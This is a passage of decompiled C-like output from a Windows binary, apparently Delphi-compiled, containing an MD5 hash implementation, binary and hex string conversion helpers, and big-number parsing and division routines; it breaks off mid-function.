void FUN_0041461c(int param_1,uint *param_2)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack28;
  undefined *puStack24;
  undefined *puStack20;
  uint *local_8;
  
  puStack20 = &stack0xfffffffc;
  local_8 = (uint *)0x0;
  puStack24 = &LAB_00414661;
  uStack28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack28;
  FUN_0040653c((LPCSTR)param_2,(int *)&local_8);
  FUN_00414584(param_1,param_2,local_8);
  *in_FS_OFFSET = uStack28;
  puStack20 = &LAB_00414668;
  puStack24 = (undefined *)0x414660;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_00414670(int param_1,byte param_2,uint param_3)

{
  uint local_4;
  
  local_4 = param_3 & 0xffffff00 | (uint)param_2;
  FUN_00414510(param_1,&local_4,1);
  return;
}



void FUN_00414684(void)

{
  InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_00442860);
  DAT_00442848 = CreateEventA((LPSECURITY_ATTRIBUTES)0x0,-1,0,"");
  if (DAT_00442848 == (HANDLE)0x0) {
    FUN_0040cc2c();
  }
  return;
}



void FUN_004146b8(void)

{
  DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_00442860);
  CloseHandle(DAT_00442848);
  return;
}



void FUN_004146d0(void)

{
  undefined4 *puVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack28;
  undefined *puStack24;
  undefined *puStack20;
  
  puStack20 = (undefined *)0x4146e0;
  puVar1 = (undefined4 *)FUN_00411d48(DAT_00442850);
  puStack24 = &DAT_00414725;
  uStack28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack28;
  iVar3 = puVar1[2];
  if (-1 < iVar3 + -1) {
    iVar4 = 0;
    puStack20 = &stack0xfffffffc;
    do {
      piVar2 = (int *)FUN_00411aa4(puVar1,iVar4);
      FUN_00403b24(piVar2);
      iVar4 = iVar4 + 1;
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
  }
  *in_FS_OFFSET = uStack28;
  puStack20 = &LAB_0041472c;
  puStack24 = (undefined *)0x414724;
  FUN_00411dac(DAT_00442850);
  return;
}



uint FUN_00414888(uint param_1,uint param_2,uint param_3)

{
  return param_1 & param_2 | ~param_1 & param_3;
}



uint FUN_00414898(uint param_1,uint param_2,uint param_3)

{
  return param_1 & param_3 | ~param_3 & param_2;
}



uint FUN_004148a4(uint param_1,uint param_2,uint param_3)

{
  return param_1 ^ param_2 ^ param_3;
}



uint FUN_004148ac(uint param_1,uint param_2,uint param_3)

{
  return (~param_3 | param_1) ^ param_2;
}



uint FUN_004148b8(uint param_1,byte param_2)

{
  return param_1 << (param_2 & 0x1f) | param_1 >> (0x20 - param_2 & 0x1f);
}



void FUN_004148d8(uint *param_1,uint param_2,uint param_3,int param_4,byte param_5,int param_6,
                 uint param_7)

{
  uint uVar1;
  
  uVar1 = FUN_00414888(param_2,param_3,param_7);
  *param_1 = uVar1 + *param_1 + param_6 + param_4;
  uVar1 = FUN_004148b8(*param_1,param_5);
  *param_1 = uVar1;
  *param_1 = *param_1 + param_2;
  return;
}



void FUN_00414910(uint *param_1,uint param_2,uint param_3,int param_4,byte param_5,int param_6,
                 uint param_7)

{
  uint uVar1;
  
  uVar1 = FUN_00414898(param_2,param_3,param_7);
  *param_1 = uVar1 + *param_1 + param_6 + param_4;
  uVar1 = FUN_004148b8(*param_1,param_5);
  *param_1 = uVar1;
  *param_1 = *param_1 + param_2;
  return;
}



void FUN_00414948(uint *param_1,uint param_2,uint param_3,int param_4,byte param_5,int param_6,
                 uint param_7)

{
  uint uVar1;
  
  uVar1 = FUN_004148a4(param_2,param_3,param_7);
  *param_1 = uVar1 + *param_1 + param_6 + param_4;
  uVar1 = FUN_004148b8(*param_1,param_5);
  *param_1 = uVar1;
  *param_1 = *param_1 + param_2;
  return;
}



void FUN_00414980(uint *param_1,uint param_2,uint param_3,int param_4,byte param_5,int param_6,
                 uint param_7)

{
  uint uVar1;
  
  uVar1 = FUN_004148ac(param_2,param_3,param_7);
  *param_1 = uVar1 + *param_1 + param_6 + param_4;
  uVar1 = FUN_004148b8(*param_1,param_5);
  *param_1 = uVar1;
  *param_1 = *param_1 + param_2;
  return;
}



void FUN_004149b8(int param_1,int param_2,uint param_3)

{
  uint uVar1;
  int iVar2;
  
  uVar1 = 0;
  iVar2 = 0;
  if (param_3 != 0) {
    do {
      *(undefined *)(param_1 + uVar1) = *(undefined *)(param_2 + iVar2 * 4);
      *(char *)(param_1 + 1 + uVar1) = (char)((uint)*(undefined4 *)(param_2 + iVar2 * 4) >> 8);
      *(char *)(param_1 + 2 + uVar1) = (char)((uint)*(undefined4 *)(param_2 + iVar2 * 4) >> 0x10);
      *(char *)(param_1 + 3 + uVar1) = (char)((uint)*(undefined4 *)(param_2 + iVar2 * 4) >> 0x18);
      uVar1 = uVar1 + 4;
      iVar2 = iVar2 + 1;
    } while (uVar1 < param_3);
  }
  return;
}



void FUN_00414a00(int param_1,int param_2,uint param_3)

{
  uint uVar1;
  int iVar2;
  
  uVar1 = 0;
  iVar2 = 0;
  if (param_3 != 0) {
    do {
      *(uint *)(param_1 + iVar2 * 4) =
           CONCAT13(*(undefined *)(param_2 + 3 + uVar1),
                    CONCAT12(*(undefined *)(param_2 + 2 + uVar1),
                             CONCAT11(*(undefined *)(param_2 + 1 + uVar1),
                                      *(undefined *)(param_2 + uVar1))));
      uVar1 = uVar1 + 4;
      iVar2 = iVar2 + 1;
    } while (uVar1 < param_3);
  }
  return;
}



void FUN_00414a40(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  FUN_0040285c(param_2,param_1,param_3);
  return;
}



void FUN_00414a48(undefined4 *param_1,undefined param_2,uint param_3)

{
  FUN_004030a0(param_1,param_3,param_2);
  return;
}



void FUN_00414a58(uint *param_1,int param_2)

{
  uint local_60;
  uint local_5c;
  uint local_58;
  uint local_54;
  int local_50;
  int local_4c;
  int local_48;
  int local_44;
  int local_40;
  int local_3c;
  int local_38;
  int local_34;
  int local_30;
  int local_2c;
  int local_28;
  int local_24;
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  
  local_60 = *param_1;
  local_5c = param_1[1];
  local_58 = param_1[2];
  local_54 = param_1[3];
  FUN_00414a00((int)&local_50,param_2,0x40);
  FUN_004148d8(&local_60,local_5c,local_58,-0x28955b88,7,local_50,local_54);
  FUN_004148d8(&local_54,local_60,local_5c,-0x173848aa,0xc,local_4c,local_58);
  FUN_004148d8(&local_58,local_54,local_60,0x242070db,0x11,local_48,local_5c);
  FUN_004148d8(&local_5c,local_58,local_54,-0x3e423112,0x16,local_44,local_60);
  FUN_004148d8(&local_60,local_5c,local_58,-0xa83f051,7,local_40,local_54);
  FUN_004148d8(&local_54,local_60,local_5c,0x4787c62a,0xc,local_3c,local_58);
  FUN_004148d8(&local_58,local_54,local_60,-0x57cfb9ed,0x11,local_38,local_5c);
  FUN_004148d8(&local_5c,local_58,local_54,-0x2b96aff,0x16,local_34,local_60);
  FUN_004148d8(&local_60,local_5c,local_58,0x698098d8,7,local_30,local_54);
  FUN_004148d8(&local_54,local_60,local_5c,-0x74bb0851,0xc,local_2c,local_58);
  FUN_004148d8(&local_58,local_54,local_60,-0xa44f,0x11,local_28,local_5c);
  FUN_004148d8(&local_5c,local_58,local_54,-0x76a32842,0x16,local_24,local_60);
  FUN_004148d8(&local_60,local_5c,local_58,0x6b901122,7,local_20,local_54);
  FUN_004148d8(&local_54,local_60,local_5c,-0x2678e6d,0xc,local_1c,local_58);
  FUN_004148d8(&local_58,local_54,local_60,-0x5986bc72,0x11,local_18,local_5c);
  FUN_004148d8(&local_5c,local_58,local_54,0x49b40821,0x16,local_14,local_60);
  FUN_00414910(&local_60,local_5c,local_58,-0x9e1da9e,5,local_4c,local_54);
  FUN_00414910(&local_54,local_60,local_5c,-0x3fbf4cc0,9,local_38,local_58);
  FUN_00414910(&local_58,local_54,local_60,0x265e5a51,0xe,local_24,local_5c);
  FUN_00414910(&local_5c,local_58,local_54,-0x16493856,0x14,local_50,local_60);
  FUN_00414910(&local_60,local_5c,local_58,-0x29d0efa3,5,local_3c,local_54);
  FUN_00414910(&local_54,local_60,local_5c,0x2441453,9,local_28,local_58);
  FUN_00414910(&local_58,local_54,local_60,-0x275e197f,0xe,local_14,local_5c);
  FUN_00414910(&local_5c,local_58,local_54,-0x182c0438,0x14,local_40,local_60);
  FUN_00414910(&local_60,local_5c,local_58,0x21e1cde6,5,local_2c,local_54);
  FUN_00414910(&local_54,local_60,local_5c,-0x3cc8f82a,9,local_18,local_58);
  FUN_00414910(&local_58,local_54,local_60,-0xb2af279,0xe,local_44,local_5c);
  FUN_00414910(&local_5c,local_58,local_54,0x455a14ed,0x14,local_30,local_60);
  FUN_00414910(&local_60,local_5c,local_58,-0x561c16fb,5,local_1c,local_54);
  FUN_00414910(&local_54,local_60,local_5c,-0x3105c08,9,local_48,local_58);
  FUN_00414910(&local_58,local_54,local_60,0x676f02d9,0xe,local_34,local_5c);
  FUN_00414910(&local_5c,local_58,local_54,-0x72d5b376,0x14,local_20,local_60);
  FUN_00414948(&local_60,local_5c,local_58,-0x5c6be,4,local_3c,local_54);
  FUN_00414948(&local_54,local_60,local_5c,-0x788e097f,0xb,local_30,local_58);
  FUN_00414948(&local_58,local_54,local_60,0x6d9d6122,0x10,local_24,local_5c);
  FUN_00414948(&local_5c,local_58,local_54,-0x21ac7f4,0x17,local_18,local_60);
  FUN_00414948(&local_60,local_5c,local_58,-0x5b4115bc,4,local_4c,local_54);
  FUN_00414948(&local_54,local_60,local_5c,0x4bdecfa9,0xb,local_40,local_58);
  FUN_00414948(&local_58,local_54,local_60,-0x944b4a0,0x10,local_34,local_5c);
  FUN_00414948(&local_5c,local_58,local_54,-0x41404390,0x17,local_28,local_60);
  FUN_00414948(&local_60,local_5c,local_58,0x289b7ec6,4,local_1c,local_54);
  FUN_00414948(&local_54,local_60,local_5c,-0x155ed806,0xb,local_50,local_58);
  FUN_00414948(&local_58,local_54,local_60,-0x2b10cf7b,0x10,local_44,local_5c);
  FUN_00414948(&local_5c,local_58,local_54,0x4881d05,0x17,local_38,local_60);
  FUN_00414948(&local_60,local_5c,local_58,-0x262b2fc7,4,local_2c,local_54);
  FUN_00414948(&local_54,local_60,local_5c,-0x1924661b,0xb,local_20,local_58);
  FUN_00414948(&local_58,local_54,local_60,0x1fa27cf8,0x10,local_14,local_5c);
  FUN_00414948(&local_5c,local_58,local_54,-0x3b53a99b,0x17,local_48,local_60);
  FUN_00414980(&local_60,local_5c,local_58,-0xbd6ddbc,6,local_50,local_54);
  FUN_00414980(&local_54,local_60,local_5c,0x432aff97,10,local_34,local_58);
  FUN_00414980(&local_58,local_54,local_60,-0x546bdc59,0xf,local_18,local_5c);
  FUN_00414980(&local_5c,local_58,local_54,-0x36c5fc7,0x15,local_3c,local_60);
  FUN_00414980(&local_60,local_5c,local_58,0x655b59c3,6,local_20,local_54);
  FUN_00414980(&local_54,local_60,local_5c,-0x70f3336e,10,local_44,local_58);
  FUN_00414980(&local_58,local_54,local_60,-0x100b83,0xf,local_28,local_5c);
  FUN_00414980(&local_5c,local_58,local_54,-0x7a7ba22f,0x15,local_4c,local_60);
  FUN_00414980(&local_60,local_5c,local_58,0x6fa87e4f,6,local_30,local_54);
  FUN_00414980(&local_54,local_60,local_5c,-0x1d31920,10,local_14,local_58);
  FUN_00414980(&local_58,local_54,local_60,-0x5cfebcec,0xf,local_38,local_5c);
  FUN_00414980(&local_5c,local_58,local_54,0x4e0811a1,0x15,local_1c,local_60);
  FUN_00414980(&local_60,local_5c,local_58,-0x8ac817e,6,local_40,local_54);
  FUN_00414980(&local_54,local_60,local_5c,-0x42c50dcb,10,local_24,local_58);
  FUN_00414980(&local_58,local_54,local_60,0x2ad7d2bb,0xf,local_48,local_5c);
  FUN_00414980(&local_5c,local_58,local_54,-0x14792c6f,0x15,local_2c,local_60);
  *param_1 = *param_1 + local_60;
  param_1[1] = param_1[1] + local_5c;
  param_1[2] = param_1[2] + local_58;
  param_1[3] = param_1[3] + local_54;
  FUN_00414a48(&local_50,0,0x40);
  return;
}



void FUN_00415190(undefined4 *param_1)

{
  FUN_004030a0(param_1,0x58,0);
  *param_1 = 0x67452301;
  param_1[1] = 0xefcdab89;
  param_1[2] = 0x98badcfe;
  param_1[3] = 0x10325476;
  return;
}



void FUN_004151c0(uint *param_1,undefined4 *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = param_1[4] >> 3 & 0x3f;
  uVar2 = param_3 * 8;
  param_1[4] = param_1[4] + uVar2;
  if (param_1[4] <= uVar2 && uVar2 != param_1[4]) {
    param_1[5] = param_1[5] + 1;
  }
  param_1[5] = param_1[5] + (param_3 >> 0x1d);
  uVar2 = 0x40 - uVar1;
  if (param_3 < uVar2) {
    uVar2 = 0;
  }
  else {
    FUN_00414a40((undefined4 *)((int)param_1 + uVar1 + 0x18),param_2,uVar2);
    FUN_00414a58(param_1,(int)(param_1 + 6));
    for (; uVar2 + 0x3f < param_3; uVar2 = uVar2 + 0x40) {
      FUN_00414a58(param_1,(int)param_2 + uVar2);
    }
    uVar1 = 0;
  }
  FUN_00414a40((undefined4 *)((int)param_1 + uVar1 + 0x18),(undefined4 *)((int)param_2 + uVar2),
               param_3 - uVar2);
  return;
}



void FUN_00415240(int param_1,uint *param_2)

{
  uint uVar1;
  undefined4 auStack16 [2];
  
  FUN_004149b8((int)auStack16,(int)(param_2 + 4),8);
  uVar1 = param_2[4] >> 3 & 0x3f;
  if (uVar1 < 0x38) {
    uVar1 = 0x38 - uVar1;
  }
  else {
    uVar1 = 0x78 - uVar1;
  }
  FUN_004151c0(param_2,(undefined4 *)&DAT_0043f3c4,uVar1);
  FUN_004151c0(param_2,auStack16,8);
  FUN_004149b8(param_1,(int)param_2,0x10);
  FUN_00414a48(param_2,0,0x58);
  return;
}



void FUN_004152b8(byte *param_1,int *param_2)

{
  byte *pbVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  undefined4 *local_c;
  byte *local_8;
  
  puStack28 = &stack0xfffffffc;
  local_c = (undefined4 *)0x0;
  puStack32 = &LAB_0041531d;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  local_8 = param_1;
  FUN_004047a8(param_2);
  iVar2 = 0x10;
  pbVar1 = local_8;
  do {
    FUN_00408150((uint)*pbVar1,2,(int *)&local_c);
    FUN_00404a70(param_2,local_c);
    pbVar1 = pbVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_00415324;
  puStack32 = (undefined *)0x41531c;
  FUN_004047a8((int *)&local_c);
  return;
}



void FUN_0041532c(undefined *param_1,int param_2)

{
  uint uVar1;
  undefined4 *puVar2;
  
  uVar1 = FUN_00404a68((int)param_1);
  puVar2 = (undefined4 *)FUN_00404c68(param_1);
  FUN_0041534c(puVar2,uVar1,param_2);
  return;
}



void FUN_0041534c(undefined4 *param_1,uint param_2,int param_3)

{
  uint auStack100 [22];
  
  FUN_00415190(auStack100);
  FUN_004151c0(auStack100,param_1,param_2);
  FUN_00415240(param_3,auStack100);
  return;
}



uint FUN_004153b4(undefined param_1,undefined param_2,undefined param_3,uint param_4,int param_5,
                 uint param_6,int param_7)

{
  if (param_7 == param_5) {
    if (param_4 <= param_6) {
      return param_4;
    }
  }
  else if (param_5 <= param_7) {
    return param_4;
  }
  return param_6;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004153f4(void)

{
  undefined4 uVar1;
  undefined4 *in_FS_OFFSET;
  undefined auStack16 [12];
  
  uVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = auStack16;
  _DAT_0044287c = _DAT_0044287c + 1;
  *in_FS_OFFSET = uVar1;
  return;
}



void FUN_00415468(byte *param_1,int param_2)

{
  byte bVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined uVar3;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  uint *local_c;
  byte *local_8;
  
  puStack28 = &stack0xfffffffc;
  local_c = (uint *)0x0;
  puStack32 = &LAB_004154df;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  bVar1 = 0;
  uVar3 = true;
  iVar2 = 1;
  local_8 = param_1;
  do {
    FUN_00404cc8(param_2,iVar2,1,(int *)&local_c);
    FUN_00404bb4(local_c,(uint *)&DAT_004154f8);
    if ((bool)uVar3) {
      bVar1 = bVar1 | '\x01' << (8U - (char)iVar2 & 0x1f);
    }
    iVar2 = iVar2 + 1;
    uVar3 = iVar2 == 9;
  } while (!(bool)uVar3);
  *local_8 = bVar1;
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_004154e6;
  puStack32 = (undefined *)0x4154de;
  FUN_004047a8((int *)&local_c);
  return;
}



void FUN_004154fc(int param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack120;
  undefined *puStack116;
  undefined *puStack112;
  undefined4 local_60 [3];
  undefined4 local_54 [2];
  undefined4 local_4c [2];
  undefined4 local_44 [2];
  undefined4 local_3c [2];
  undefined4 local_34;
  byte local_30;
  char local_2f;
  undefined4 local_2c;
  undefined local_28;
  char local_27;
  byte local_21;
  undefined4 *local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  int local_8;
  
  puStack112 = &stack0xfffffffc;
  local_20 = (undefined4 *)0x0;
  puStack116 = &LAB_004156ef;
  uStack120 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack120;
  local_c = 0;
  local_8 = param_1;
  do {
    local_10 = 0;
    do {
      local_14 = 0;
      do {
        local_18 = 0;
        do {
          local_1c = 0;
          do {
            iVar3 = 0;
            do {
              iVar2 = 0;
              do {
                iVar1 = 0;
                do {
                  local_27 = (char)local_c + '0';
                  local_28 = 1;
                  FUN_00402f50(&local_2c,(undefined4 *)&local_28);
                  local_2f = (char)local_10 + '0';
                  local_30 = 1;
                  FUN_00402f20((byte *)&local_2c,&local_30,2);
                  FUN_00402f50(&local_34,&local_2c);
                  local_2f = (char)local_14 + '0';
                  local_30 = 1;
                  FUN_00402f20((byte *)&local_34,&local_30,3);
                  FUN_00402f50(local_3c,&local_34);
                  local_2f = (char)local_18 + '0';
                  local_30 = 1;
                  FUN_00402f20((byte *)local_3c,&local_30,4);
                  FUN_00402f50(local_44,local_3c);
                  local_2f = (char)local_1c + '0';
                  local_30 = 1;
                  FUN_00402f20((byte *)local_44,&local_30,5);
                  FUN_00402f50(local_4c,local_44);
                  local_2f = (char)iVar3 + '0';
                  local_30 = 1;
                  FUN_00402f20((byte *)local_4c,&local_30,6);
                  FUN_00402f50(local_54,local_4c);
                  local_2f = (char)iVar2 + '0';
                  local_30 = 1;
                  FUN_00402f20((byte *)local_54,&local_30,7);
                  FUN_00402f50(local_60,local_54);
                  local_2f = (char)iVar1 + '0';
                  local_30 = 1;
                  FUN_00402f20((byte *)local_60,&local_30,8);
                  FUN_00404a0c((int *)&local_20,(byte *)local_60);
                  FUN_00415468(&local_21,(int)local_20);
                  FUN_004047fc((int *)(local_8 + (uint)local_21 * 4),local_20);
                  iVar1 = iVar1 + 1;
                } while (iVar1 != 2);
                iVar2 = iVar2 + 1;
              } while (iVar2 != 2);
              iVar3 = iVar3 + 1;
            } while (iVar3 != 2);
            local_1c = local_1c + 1;
          } while (local_1c != 2);
          local_18 = local_18 + 1;
        } while (local_18 != 2);
        local_14 = local_14 + 1;
      } while (local_14 != 2);
      local_10 = local_10 + 1;
    } while (local_10 != 2);
    local_c = local_c + 1;
  } while (local_c != 2);
  *in_FS_OFFSET = uStack120;
  puStack112 = &LAB_004156f6;
  puStack116 = (undefined *)0x4156ee;
  FUN_004047a8((int *)&local_20);
  return;
}



void FUN_00415700(int param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack1056;
  undefined *puStack1052;
  undefined *puStack1048;
  int *local_408 [256];
  int local_8;
  
  puStack1048 = (undefined *)0x415727;
  local_8 = param_1;
  FUN_00405130(local_408,&DAT_00401034,0x100);
  puStack1052 = &LAB_0041579d;
  uStack1056 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack1056;
  puStack1048 = &stack0xfffffffc;
  FUN_004047a8(param_2);
  FUN_004154fc((int)local_408);
  iVar1 = FUN_00404a68(local_8);
  if (0 < iVar1) {
    iVar2 = 1;
    do {
      FUN_00404a70(param_2,local_408[*(byte *)(local_8 + -1 + iVar2)]);
      iVar2 = iVar2 + 1;
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
  }
  *in_FS_OFFSET = uStack1056;
  puStack1048 = &LAB_004157a4;
  puStack1052 = (undefined *)0x41579c;
  FUN_0040521c(local_408,&DAT_00401034,0x100);
  return;
}



void FUN_004157ac(undefined4 *param_1,int *param_2)

{
  uint uVar1;
  int iVar2;
  uint extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack40;
  undefined *puStack36;
  undefined *puStack32;
  undefined4 *local_14;
  int local_10;
  byte local_9;
  undefined4 *local_8;
  
  local_14 = (undefined4 *)0x0;
  local_10 = 0;
  puStack32 = (undefined *)0x4157c9;
  local_8 = param_1;
  FUN_00404c58((int)param_1);
  puStack36 = &LAB_0041588e;
  uStack40 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack40;
  puStack32 = &stack0xfffffffc;
  FUN_004047a8(param_2);
  while( true ) {
    uVar1 = FUN_00404a68((int)local_8);
    uVar1 = uVar1 & 0x80000007;
    if ((int)uVar1 < 0) {
      uVar1 = (uVar1 - 1 | 0xfffffff8) + 1;
    }
    if (uVar1 == 0) break;
    FUN_00404ab4((int *)&local_8,(undefined4 *)&DAT_004158a4,local_8);
  }
  iVar2 = FUN_00404a68((int)local_8);
  if (iVar2 < 0) {
    iVar2 = iVar2 + 7;
  }
  iVar2 = iVar2 >> 3;
  if (0 < iVar2) {
    do {
      FUN_00404cc8((int)local_8,1,8,&local_10);
      FUN_00415468(&local_9,local_10);
      FUN_00404990((int *)&local_14,extraout_EDX & 0xffffff00 | (uint)local_9);
      FUN_00404a70(param_2,local_14);
      FUN_00404d08((int *)&local_8,1,8);
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
  }
  *in_FS_OFFSET = uStack40;
  puStack32 = &LAB_00415895;
  puStack36 = (undefined *)0x415885;
  FUN_004047cc((int *)&local_14,2);
  puStack36 = (undefined *)0x41588d;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_004158a8(int param_1,char **param_2)

{
  int iVar1;
  int iVar2;
  int local_14;
  
  FUN_004047a8((int *)param_2);
  local_14 = **(int **)(param_1 + 4);
  if (local_14 != 0) {
    iVar2 = 1;
    do {
      iVar1 = 0;
      do {
        if ((*(uint *)(*(int *)(param_1 + 4) + iVar2 * 4) >> ((byte)iVar1 & 0x1f) & 1) == 1) {
          FUN_00404ab4((int *)param_2,(undefined4 *)&DAT_0041594c,(undefined4 *)*param_2);
        }
        else {
          FUN_00404ab4((int *)param_2,(undefined4 *)&DAT_00415958,(undefined4 *)*param_2);
        }
        iVar1 = iVar1 + 1;
      } while (iVar1 != 0x1f);
      iVar2 = iVar2 + 1;
      local_14 = local_14 + -1;
    } while (local_14 != 0);
  }
  while ((iVar2 = FUN_00404a68((int)*param_2), 1 < iVar2 && (**param_2 == '0'))) {
    FUN_00404d08((int *)param_2,1,1);
  }
  if (*param_2 == (char *)0x0) {
    FUN_004047fc((int *)param_2,(undefined4 *)&DAT_00415958);
  }
  return;
}



void FUN_0041595c(char *param_1,undefined *param_2)

{
  uint *puVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  uint local_c;
  char *local_8;
  
  puStack28 = (undefined *)0x415972;
  local_8 = param_1;
  FUN_00404c58((int)param_1);
  puStack32 = &LAB_00415a78;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  puStack28 = &stack0xfffffffc;
  while (*local_8 == '0') {
    iVar2 = FUN_00404a68((int)local_8);
    if (iVar2 < 2) break;
    FUN_00404d08((int *)&local_8,1,1);
  }
  iVar2 = FUN_00404a68((int)local_8);
  local_c = iVar2 / 0x1f;
  iVar2 = FUN_00404a68((int)local_8);
  if (iVar2 % 0x1f != 0) {
    local_c = local_c + 1;
  }
  FUN_00405948((int **)(param_2 + 4),(int)&DAT_00415430,1);
  **(uint **)(param_2 + 4) = local_c;
  uVar4 = 1;
  *(undefined4 *)(*(int *)(param_2 + 4) + 4) = 0;
  iVar2 = 0;
  while( true ) {
    iVar3 = FUN_00404a68((int)local_8);
    if (iVar3 < 1) break;
    iVar3 = FUN_00404a68((int)local_8);
    if (local_8[iVar3 + -1] == '1') {
      puVar1 = (uint *)(*(int *)(param_2 + 4) + uVar4 * 4);
      *puVar1 = *puVar1 | 1 << ((byte)iVar2 & 0x1f);
    }
    iVar2 = iVar2 + 1;
    if (iVar2 == 0x1f) {
      iVar2 = 0;
      uVar4 = uVar4 + 1;
      if (uVar4 <= local_c) {
        *(undefined4 *)(*(int *)(param_2 + 4) + uVar4 * 4) = 0;
      }
    }
    iVar3 = FUN_00404a68((int)local_8);
    FUN_00404d08((int *)&local_8,iVar3,1);
  }
  *param_2 = 1;
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_00415a7f;
  puStack32 = (undefined *)0x415a77;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_00415a88(int param_1,undefined *param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  bool bVar3;
  undefined4 uStack1060;
  undefined *puStack1056;
  undefined *puStack1052;
  int *local_40c [256];
  uint *local_c;
  int local_8;
  
  local_c = (uint *)0x0;
  puStack1052 = (undefined *)0x415aa6;
  local_8 = param_1;
  FUN_00404c58(param_1);
  puStack1052 = (undefined *)0x415abc;
  FUN_00405130(local_40c,&DAT_00401034,0x100);
  puStack1056 = &LAB_00415b76;
  uStack1060 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack1060;
  puStack1052 = &stack0xfffffffc;
  FUN_004047a8((int *)&local_c);
  FUN_004154fc((int)local_40c);
  iVar1 = FUN_00404a68(local_8);
  if (0 < iVar1) {
    iVar2 = 1;
    do {
      FUN_00404a70((int *)&local_c,local_40c[*(byte *)(local_8 + -1 + iVar2)]);
      iVar2 = iVar2 + 1;
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
  }
  while ((bVar3 = *(char *)local_c == '0', bVar3 &&
         (FUN_00404bb4(local_c,(uint *)&DAT_00415b8c), !bVar3))) {
    FUN_00404d08((int *)&local_c,1,1);
  }
  FUN_0041595c((char *)local_c,param_2);
  *in_FS_OFFSET = uStack1060;
  puStack1052 = &LAB_00415b7d;
  puStack1056 = (undefined *)0x415b68;
  FUN_0040521c(local_40c,&DAT_00401034,0x100);
  puStack1056 = (undefined *)0x415b75;
  FUN_004047cc((int *)&local_c,2);
  return;
}



void FUN_00415b90(int param_1,uint param_2,undefined2 *param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  
  uVar1 = 0;
  uVar3 = **(uint **)(param_1 + 4);
  for (uVar2 = uVar3; uVar2 != 0; uVar2 = uVar2 - 1) {
    uVar1 = *(int *)(*(int *)(param_1 + 4) + uVar2 * 4) + uVar1 * 10000;
    *(uint *)(*(int *)(param_1 + 4) + uVar2 * 4) = uVar1 / param_2;
    uVar1 = uVar1 % param_2;
  }
  *param_3 = (short)uVar1;
  for (; (*(int *)(*(int *)(param_1 + 4) + uVar3 * 4) == 0 && (1 < uVar3)); uVar3 = uVar3 - 1) {
  }
  if (uVar3 != **(uint **)(param_1 + 4)) {
    FUN_00405948((int **)(param_1 + 4),(int)&DAT_00415430,1);
    **(uint **)(param_1 + 4) = uVar3;
  }
  return;
}



void FUN_00415c1c(byte *param_1,undefined *param_2)

{
  byte bVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  byte *pbVar5;
  undefined4 *unaff_EBX;
  byte *unaff_ESI;
  int iVar6;
  undefined4 *in_FS_OFFSET;
  undefined uVar7;
  int *piVar8;
  undefined4 *local_28;
  uint *local_24;
  uint *local_20;
  undefined4 uVar9;
  undefined4 uStack16;
  int local_c;
  byte *local_8;
  
  uStack16 = 4;
  do {
    uStack16 = uStack16 - 1;
  } while (uStack16 != 0);
  local_20 = (uint *)0x415c3c;
  local_8 = param_1;
  FUN_00404c58((int)param_1);
  local_24 = (uint *)&LAB_00415e55;
  local_28 = (undefined4 *)*in_FS_OFFSET;
  *in_FS_OFFSET = &local_28;
  local_20 = (uint *)&stack0xfffffffc;
  while( true ) {
    uVar7 = *local_8 == 0x2d;
    if (((bool)uVar7) || (bVar1 = *local_8 - 0x30, uVar7 = bVar1 == 10, bVar1 < 10)) break;
    iVar2 = FUN_00404a68((int)local_8);
    uVar7 = iVar2 == 1;
    if (iVar2 < 2) break;
    FUN_00404d08((int *)&local_8,1,1);
  }
  FUN_00404cc8((int)local_8,1,1,(int *)&local_20);
  FUN_00404bb4(local_20,(uint *)&DAT_00415e6c);
  if ((bool)uVar7) {
    uVar9 = 0;
    FUN_00404d08((int *)&local_8,1,1);
  }
  else {
    uVar9 = 0x1000000;
  }
  while( true ) {
    iVar2 = FUN_00404a68((int)local_8);
    uVar7 = iVar2 == 1;
    if (iVar2 < 2) break;
    FUN_00404cc8((int)local_8,1,1,(int *)&local_24);
